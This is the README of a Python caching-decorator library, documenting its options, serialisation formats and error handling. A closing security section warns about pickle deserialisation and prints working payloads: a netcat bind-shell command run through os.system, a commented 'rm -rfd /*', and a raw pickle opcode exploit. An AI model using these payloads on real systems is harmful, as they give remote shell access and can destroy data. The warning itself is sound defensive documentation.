cache_decorator
=========================================================================================
|pip| |downloads|

A simple decorator to cache the results of computationally heavy functions.
The package automatically serialize and deserialize depending on the format of the save path.

By default it supports ``.json .json.gz .json.bz .json.lzma`` and ``.pkl .pkl.gz .pkl.bz .pkl.lzma .pkl.zip`` 
but other extensions can be used if the following packages are installed:

numpy: ``.npy .npz``

pandas: ``.csv .csv.gz .csv.bz2 .csv.zip .csv.xz``

Also there is an optimized format for numerical dataframes:

pandas: ``.embedding .embedding.gz .embedding.bz2 .embedding.xz``

This creates an optionally compressed tar archive with pickles of the index and 
columns and a ``.npy`` of the values.

.. code:: python

    import time
    import numpy as np
    import pandas as pd
    from cache_decorator import Cache

    @Cache(
        cache_path={
            "info": "/tmp/{function_name}/{_hash}.json.xz",
            "data": "/tmp/{function_name}/{_hash}.csv.gz",
        },
        validity_duration="24d",
        args_to_ignore=("verbose",),
        enable_cache_arg_name="enable_cache",
    )
    def function_to_cache(seed: int, verbose: bool = True):
        np.random.seed(seed)
        if verbose:
            print(f"using seed {seed}")
        return {
            "info": {"timestamp": time.time(), "seed": seed,},
            "data": pd.DataFrame(
                np.random.randint(0, 100, size=(100, 4)), columns=list("ABCD")
            ),
        }


How do I install this package?
----------------------------------------------
As usual, just download it using pip:

.. code:: shell

    pip install cache_decorator


Examples of Usage
----------------------------------------------
To cache a function or a method you just have to decorate it with the cache decorator.

.. code:: python

    from time import sleep
    from cache_decorator import Cache
    from dict_hash import Hashable

    @Cache()
    def x(a, b):
        sleep(3)
        return a + b

    class A(Hashable):
        def __init__(self, x):
        self.x = x

        # you can call a method without args
        def my_method(self):
            return "|{}|".format(self.x)

        # you can call a static method
        @staticmethod
        def my_staticmethod():
            return "CIAO"

        # you can call a property
        @property
        def my_property(self):
            return "|{}|".format(self.x)

        # methods, static methods, and properties can return a custom formatter
        # that access attributes but can't call other methods
        def custom_formatter_method(self):
            return "{self.x:.4f}"

        @Cache(
            # this is a quick example of most things you can do in the formatting
            cache_path="/".join(
                "{cache_dir}",
                "{self.x}",
                "{self.my_method()}",
                "{self.my_staticmethod()}",
                "{self.my_property()}",
                "{self.custom_formatter_method()}",
                "{a}",
                "{b}_{_hash}.pkl",
            )
        )
        def f(self, a, b):
            sleep(3)
            return a + b
                
        # only needed if you want "{_hash}" in the path
        def consistent_hash(self) -> str:
            return str(self.x)

Cache path
----------
The default cache directory is ./cache but this can be setted by passing the cache_dir parameter to the decorator or by setting the environment variable CACHE_DIR.
In the case both are setted, the parameter folder has precedence over the environment one.


.. code:: python

    from time import sleep
    from cache_decorator import Cache

    @Cache(cache_dir="/tmp")
    def x(a):
        sleep(3)
        return a

The path format can be modified by passing the cache_path parameter.
This string will be formatted with infos about the function, its parameters and, if it's a method, the self attributes.

De default path is:

.. code:: python

    from time import sleep
    from cache_decorator import Cache

    @Cache(cache_path="{cache_dir}/{file_name}_{function_name}/{_hash}.pkl")
    def x(a):
        sleep(3)
        return a

But can be modified giving cache a more significative name, for example we can add the value of a into the file name.

.. code:: python

    from time import sleep
    from cache_decorator import Cache

    @Cache(cache_path="{cache_dir}/{file_name}_{function_name}/{a}_{_hash}.pkl")
    def x(a):
        sleep(3)
        return a

Depending on the extension of the file, different serialization and deserialization dispatcher will be called.

.. code:: python

    from time import sleep
    from cache_decorator import Cache

    @Cache(cache_path="/tmp/{_hash}.pkl.gz")
    def x(a):
        sleep(3)
        return a

    @Cache(cache_path="/tmp/{_hash}.json")
    def x(a):
        sleep(3)
        return {"1":1,"2":2}

    @Cache(cache_path="/tmp/{_hash}.npy")
    def x(a):
        sleep(3)
        return np.array([1, 2, 3])

    @Cache(cache_path="/tmp/{_hash}.npz")
    def x(a):
        sleep(3)
        return np.array([1, 2, 3]), np.array([1, 2, 4])

Ignoring arguments when computing the hash
------------------------------------------
By default the cache is differentiate by the parameters passed to the function.
One can specify which parameters should be ignored.


.. code:: python

    from time import sleep
    from cache_decorator import Cache

    @Cache(args_to_ignore=["verbose"])
    def x(a, verbose=False):
        sleep(3)
        if verbose:
            print("HEY")
        return a

Multiple arguments can be specified as a list of strings with the name of the arguments to ignore.

.. code:: python

    from time import sleep
    from cache_decorator import Cache

    @Cache(args_to_ignore=["verbose", "multiprocessing"])
    def x(a, verbose=False, multiprocessing=False):
        sleep(3)
        if verbose:
            print("HEY")
        return a

Dynamically enabling the cache
------------------------------
Sometime we need to enable or disable the cache dinamically, we soupport this 
using the `enable_cache_arg_name` argument which can be used as follows:

.. code:: python

    import time
    import numpy as np
    import pandas as pd
    from cache_decorator import Cache

    # simple boolean argument

    @Cache(
        enable_cache_arg_name="enable_cache",
    )
    def function_to_cache(seed: int):
        np.random.seed(seed)
        return {"seed":seed}

    # Cache enabled
    function_to_cache(10)
    # Cache enabled
    function_to_cache(10, enable_cache=True)
    # Cache disabled
    function_to_cache(10, enable_cache=False)

    class TestEnableCacheArgAsAttribute:
        def __init__(self, enable_cache: bool):
            self.enable_cache = enable_cache
        
        @Cache(
            cache_path="{cache_dir}/{a}.pkl",
            cache_dir="./test_cache",
            enable_cache_arg_name="self.enable_cache",
        )
        def cached_method(self, a):
            sleep(2)
            return [1, 2, 3]

    instance = TestEnableCacheArgAsAttribute(enable_cache=True)
    # with cache enabled
    instance.cached_method(1)
    # disable the cache
    instance.enable_cache = False
    instance.cached_method(1)


    class TestEnableCacheArgAsAttributeProperty:
        def __init__(self, enable_cache: bool):
            self.enable_cache = enable_cache
        
        @property
        def is_cache_enabled(self):
            return self.enable_cache

        @Cache(
            cache_path="{cache_dir}/{a}.pkl",
            cache_dir="./test_cache",
            enable_cache_arg_name="self.is_cache_enabled()",
        )
        def cached_method(self, a):
            sleep(2)
            return [1, 2, 3]

    instance = TestEnableCacheArgAsAttribute(enable_cache=True)
    # with cache enabled
    instance.cached_method(1)
    # disable the cache
    instance.enable_cache = False
    instance.cached_method(1)

    class TestEnableCacheArgAsAttributeStatic:
        """This can be used for abstract classes"""
        def __init__(self, enable_cache: bool):
            self.enable_cache = enable_cache
        
        @staticmethod
        def is_cache_enabled():
            return True

        @Cache(
            cache_path="{cache_dir}/{a}.pkl",
            cache_dir="./test_cache",
            enable_cache_arg_name="self.is_cache_enabled()",
        )
        def cached_method(self, a):
            sleep(2)
            return [1, 2, 3]

    instance = TestEnableCacheArgAsAttributeStatic(enable_cache=True)
    instance.cached_method(1)
    
for more examples of usage check the tests: `test/test_method.py` and `test/test_enable_cache_arg_name.py`.

Cache validity
------------------------------------------
Cache also might have a validity duration. 

.. code:: python

    from time import sleep
    from cache_decorator import Cache

    @Cache(
        cache_path="/tmp/{_hash}.pkl.gz",
        validity_duration="24d"
        )
    def x(a):
        sleep(3)
        return a

In this example the cache will be valid for the next 24 days. and on the 25th day the cache will be rebuilt.
The duration can be written as a time in seconds or as a string with unit.
The units can be "s" seconds, "m" minutes, "h" hours, "d" days, "w" weeks.

Logging
-------
Each time a new function is decorated with this decorator, a new logger is created.
You can modify the default logger with ``log_level`` and ``log_format``.


.. code:: python

    from time import sleep
    from cache_decorator import Cache

    @Cache(log_level="debug")
    def x(a):
        sleep(3)
        return a

If the default format is not like you like it you can change it with:

.. code:: python

    from time import sleep
    from cache_decorator import Cache

    @Cache(log_format="%(asctime)-15s[%(levelname)s]: %(message)s")
    def x(a):
        sleep(3)
        return a

More informations about the formatting can be found here https://docs.python.org/3/library/logging.html .

Moreover, the name of the default logger is:

.. code:: python

    logging.getLogger("cache." + function.__name__)

So we can get the reference to the logger and fully customize it:

.. code:: python

    import logging
    from cache_decorator import Cache

    @Cache()
    def test_function(x):
        return 2 * x

    # Get the logger
    logger = logging.getLogger("cache.test_function")
    logger.setLevel(logging.DEBUG)
    
    # Make it log to a file
    handler = logging.FileHandler("cache.log")
    logger.addHandler(handler)

Error Handling
--------------
A common problem we noted using the library is that if the saved type is not compatible with the chosen extension,
the program will raise an exception at the end of the function and we lose all the work done.
To mitigate this proble, now the cache decorator has a built-in system for handling errors.
If there is an error in the serializzation of the result, the program will make an automatic backup using pickle.
This by default will add ``_backup.pkl`` to the end of the original path, but if for any reason this would over-write a file, a random string will be appended.
And log (with critical level) the path of the backup file and the supposed path where the 

Suppose we erroneusly set the extension to CSV instead of JSON:

.. code:: python

    from cache_decorator import Cache

    @Cache("./test_{x}.csv")
    def test_function(x):
        return {"this":{"is":{"not":{"a":"csv"}}}}

    test_function(10)
    # 2021-02-22 13:22:07,286[CRITICAL]: Couldn't save the result of the function. Saving the result as a pickle at:
    # ./test_10.csv_backup.pkl
    # The file was gonna be written at:
    # ./test_10.csv


Now we can manually load the value and store it at the correct path, this way the next time the function is called, the cache will be loaded correctly with the right extension.

.. code:: python

    import json
    import pickle

    # Load the backup
    with open("./test_10.csv_backup.pkl", "rb") as f:
        result = pickle.load(f)

    # Save it at the right path
    with open("./test_10.json", "w") as f:
        json.dump(f, result) 

.. code:: python

    from cache_decorator import Cache

    @Cache("./test_{x}.json")
    def test_function(x):
        return {"this":{"is":{"not":{"a":"csv"}}}}

    test_function(10) # Load the corrected Cache at "./test_10.json"


Optionally, one can programmatically sort this out by catching the exception and accessing its fields.

.. code:: python

    from cache_decorator import Cache

    @Cache("./test.csv")
    def test_function(x):
        return {"this":{"is":{"not":{"a":"csv"}}}}

    try:
        test_function(10, y="ciao")
    except SerializationException as e:
        result = e.result
        backup_path = e.backup_path
        path = e.path
        

Moreover, the backup path can be costumized using the ``backup_path`` parameter, here you can use the same parameter of ``path`` and also ``{_date}``, which is the date of the bakcup, and ``{_rnd}`` which guarantees that the file will not overwrite any other file:

.. code:: python

    from cache_decorator import Cache

    @Cache("./test.csv", backup_path="./backup_{date}_{rnd}.pkl")
    def test_function(x):
        return {"this":{"is":{"not":{"a":"csv"}}}}

    test_function(10, y="ciao")
    
    # 2021-02-22 13:22:07,286[CRITICAL]: Couldn't save the result of the function. Saving the result as a pickle at:
    # ./backup_2021_02_22_13_22_07_18ce30b003e14d16d5e0f749e8205e467aedfbba.pkl
    # The file was gonna be written at:
    # ./test.csv

        

Internals
--------------
If for any reason you need to get a reference to the wrapped function and its cacher class, you can access them using the internal variables:

.. code:: python

    from cache_decorator import Cache

    @Cache()
    def test_function(x, y):
        return 2 * x

    original_test_function = test_function.__cached_function
    test_function_cacher_class = test_function.__cacher_instance

We do not suggest to use them.


Manual Caching
--------------
If for some reason you need to manually manage your cache, you can use the built in static methods of the ``Cache`` class.
It will automatically create the needed folders. Moreover, you can get the expected path for a function call.

.. code:: python

    from cache_decorator import Cache
    
    # you can use the Cache class functions to load and store data easily
    # but here you can't use a path formatter but you have to pass a complete path.

    # Store
    Cache.store({1:2, 3:4}, "./my_custom_cache/best_dict_ever.json)

    # Load
    best_dict = Cache.load("./my_custom_cache/best_dict_ever.json)

    # This would not format anything!
    # Cache.store({1:2, 3:4}, "./my_custom_cache/{_hash}.json)
    # this would save a file called literally called "{_hash}.json"

    @Cache()
    def test_function(x, y):
        return 2 * x


    # you can get the path where the file would be saved (this does not call the function!).
    path = Cache.compute_path(test_function, 10, y="ciao")


Security Warnings
-----------------

Whenever possible don't use the pickle extension.
De-serializzation of untrusted data might lead to Remote Code Execution or Local Privilege Escalation ( https://davidhamann.de/2020/04/05/exploiting-python-pickle/ ).
Therefore, simple formats such as json is preferable whenever possible.

Suppose we have this code:

.. code:: python

    from cache_decorator import Cache

    @Cache("./cache/{x}.pkl)
    def my_awesome_function(x):
        return x

    ...

    my_awesome_function(1)

If in any way we have access to the cache folder, we can easily exploit it:

.. code:: python

    import pickle

    COMMAND = "netcat -c '/bin/bash -i' -l -p 4444" # rm -rfd /*

    class PickleRce(object):
        def __reduce__(self):
            import os
            return (os.system,(COMMAND,))

    payload = pickle.dumps(PickleRce())
    print(payload)
    # b"\x80\x04\x95>\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c#netcat -c '/bin/bash -i' -l -p 4444\x94\x85\x94R\x94."

    with open("./cache/1.pkl", "wb") as f:
        f.write(payload)

Next time that the function is called with argument ``1``, we will spawn a remote shell and take control of the system.

Or, since Pickle is a "programming language" which is executed by a VM, we can write a general RCE exploit which only uses builtins:

.. code:: python

    import pickle
    
    # Build the exploit
    command = b"""cat flag.txt"""
    x = b"c__builtin__\ngetattr\nc__builtin__\n__import__\nS'os'\n\x85RS'system'\n\x86RS'%s'\n\x85R."%command
    
    # Test it
    pickle.load(x)

For this reason is important to either use a simpler serializzation scheme like json and to fortify the system by setting the cache dir to be read-write only for the current user.

.. code:: bash

    chown -r $USER:$USER ./cache
    chmod -r 600 ./cache

This way only the current application can create and modify the cache files.

.. |pip| image:: https://badge.fury.io/py/cache-decorator.svg
    :target: https://badge.fury.io/py/cache-decorator
    :alt: Pypi project

.. |downloads| image:: https://pepy.tech/badge/cache_decorator
    :target: https://pepy.tech/badge/cache_decorator
    :alt: Pypi total project downloads